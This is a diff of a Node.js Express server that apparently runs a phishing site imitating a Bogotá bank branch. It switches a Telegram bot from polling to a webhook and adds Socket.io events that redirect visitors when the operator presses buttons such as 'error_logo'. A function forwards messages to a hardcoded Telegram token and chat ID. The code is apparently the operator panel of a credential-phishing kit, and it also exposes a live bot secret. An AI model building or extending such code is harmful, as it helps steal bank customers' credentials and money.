@@ -9,36 +9,52 @@ const app = express();
 const httpServer = createServer(app);
 const PORT = process.env.PORT || 3000;
 
-// Configuración de Socket.io - SIMPLIFICADO PARA RENDER
+// Configuración de Socket.io
 const io = new Server(httpServer, {
     cors: { 
-        origin: true, // Permitir cualquier origen en producción
+        origin: true,
         methods: ["GET", "POST"],
         credentials: true
     }
 });
 
-// Configuración de Telegram
+// Configuración de Telegram - SOLO WEBHOOK
 const token = process.env.TELEGRAM_TOKEN || '8582118363:AAEmFQDHohsvmLpLkUl9MHlv62IvPfxFAAY';
 const chatId = process.env.TELEGRAM_CHAT_ID || '7831097636';
-const bot = new TelegramBot(token, { polling: true });
 
-// Middlewares
-app.use(express.static(path.join(__dirname)));
-app.use('/js', express.static(path.join(__dirname, 'js')));
-app.use('/Imagenes', express.static(path.join(__dirname, 'Imagenes')));
-app.use('/css', express.static(path.join(__dirname, 'css'))); // si tienes carpeta css
-
-app.get('/favicon.ico', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Imagenes', 'channels4_profile-removebg-preview.png'));
+// SOLO WEBHOOK - SIN POLLING
+const bot = new TelegramBot(token, { 
+    polling: false
 });
 
+// Configurar webhook para Render
+const webhookUrl = `https://sucusalbogotapersona.onrender.com/api/webhook`;
 
-// Configurar CORS más permisivo para Render
+// Configurar webhook al iniciar
+bot.setWebHook(webhookUrl)
+    .then(() => {
+        console.log('✅ Webhook configurado exitosamente para:', webhookUrl);
+        console.log('🚫 Polling desactivado - Sin conflictos 409');
+    })
+    .catch(err => {
+        console.error('❌ Error configurando webhook:', err);
+    });
+
+// Ruta para recibir updates de Telegram via Webhook
+app.post('/api/webhook', (req, res) => {
+    console.log('📨 Webhook recibido de Telegram');
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+// Middlewares
+app.use(express.json());
+app.use(express.static(path.join(__dirname)));
+
+// Configurar CORS
 app.use((req, res, next) => {
     const origin = req.headers.origin;
     
-    // Permitir varios orígenes
     const allowedOrigins = [
         'https://sucusalbogotapersona.onrender.com',
         'http://localhost:3000',
@@ -68,13 +84,13 @@ app.get('/dashboard.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'dashboard.html'));
 });
 
-// Servir archivos estáticos de manera explícita
-app.get('/js/:filename', (req, res) => {
-    res.sendFile(path.join(__dirname, 'js', req.params.filename));
-});
+// Servir archivos estáticos
+app.use('/js', express.static(path.join(__dirname, 'js')));
+app.use('/Imagenes', express.static(path.join(__dirname, 'Imagenes')));
 
-app.get('/Imagenes/:filename', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Imagenes', req.params.filename));
+// Ruta para favicon
+app.get('/favicon.ico', (req, res) => {
+    res.sendFile(path.join(__dirname, 'Imagenes', 'channels4_profile-removebg-preview.png'));
 });
 
 // Función para enviar mensajes a Telegram
@@ -164,9 +180,7 @@ bot.on('callback_query', async (callbackQuery) => {
         });
 
         let redirectUrl, message;
-        const baseUrl = process.env.NODE_ENV === 'production' 
-            ? 'https://sucusalbogotapersona.onrender.com'
-            : 'http://localhost:3000';
+        const baseUrl = 'https://sucusalbogotapersona.onrender.com';
         
         switch(action) {
             case 'error_logo':
@@ -202,6 +216,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
         console.log(`📍 Redirigiendo a: ${redirectUrl}`);
         
+        // EMITIR ACCIÓN VIA SOCKET.IO PARA QUE EL CLIENTE REDIRIJA
         io.emit('telegram_action', {
             action: action,
             messageId: messageId,
@@ -226,6 +241,7 @@ io.on('connection', (socket) => {
 // Iniciar servidor
 httpServer.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor ejecutándose en puerto: ${PORT}`);
-    console.log(`🤖 Bot de Telegram iniciado en modo polling`);
-    console.log(`🌍 Entorno: ${process.env.NODE_ENV || 'development'}`);
+    console.log(`🌍 Entorno: ${process.env.NODE_ENV || 'production'}`);
+    console.log(`🔗 URL: https://sucusalbogotapersona.onrender.com`);
+    console.log(`🤖 Bot configurado: SOLO WEBHOOK`);
 });
